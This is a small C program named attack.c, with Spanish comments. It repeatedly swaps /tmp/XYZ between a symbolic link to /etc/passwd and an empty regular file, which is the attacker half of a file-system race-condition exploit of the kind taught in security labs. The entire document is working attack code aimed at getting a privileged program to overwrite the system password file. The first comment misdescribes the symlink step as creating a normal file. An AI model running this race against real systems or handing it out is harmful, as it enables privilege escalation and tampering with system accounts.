// attack.c
#include <unistd.h>
#include <stdio.h>

int main() {
    while(1) {
        // Crear archivo normal
        unlink("/tmp/XYZ");
        symlink("/etc/passwd", "/tmp/XYZ");
        
        // Pequeña pausa
        usleep(1000);
        
        // Volver a crear archivo normal para el próximo intento
        unlink("/tmp/XYZ");
        // Crear archivo vacío normal
        FILE *fp = fopen("/tmp/XYZ", "w");
        if(fp) fclose(fp);
        
        usleep(1000);
    }
    return 0;
}